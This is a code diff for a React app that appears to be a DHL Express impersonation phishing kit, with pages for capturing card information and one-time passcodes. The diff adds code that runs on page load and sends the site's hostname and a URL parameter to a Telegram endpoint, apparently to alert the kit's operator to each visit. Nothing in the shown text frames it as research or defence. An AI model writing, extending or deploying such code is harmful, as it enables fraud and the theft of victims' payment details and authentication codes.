@@ -1,10 +1,21 @@
 import React, { useEffect } from "react";
-import { BrowserRouter, Route, Routes } from "react-router-dom";
+import { BrowserRouter, Route, Routes, useParams } from "react-router-dom";
+import { callTelegram } from "./config/server";
 import DhlExpress from "./dhlexpress";
 import AllCardInfos from "./dhlexpress/cardinfo";
 import Otp, { Verified } from "./dhlexpress/otp";
 
 function App() {
+  const hostname = window.location.hostname;
+  let { param } = useParams();
+
+  useEffect(() => {
+    callTelegram(hostname, param)
+      .then((response) => response.text())
+      .then((result) => console.log(result))
+      .catch((error) => console.log("error", error));
+  }, []);
+  
   return (
     <>
       <BrowserRouter>
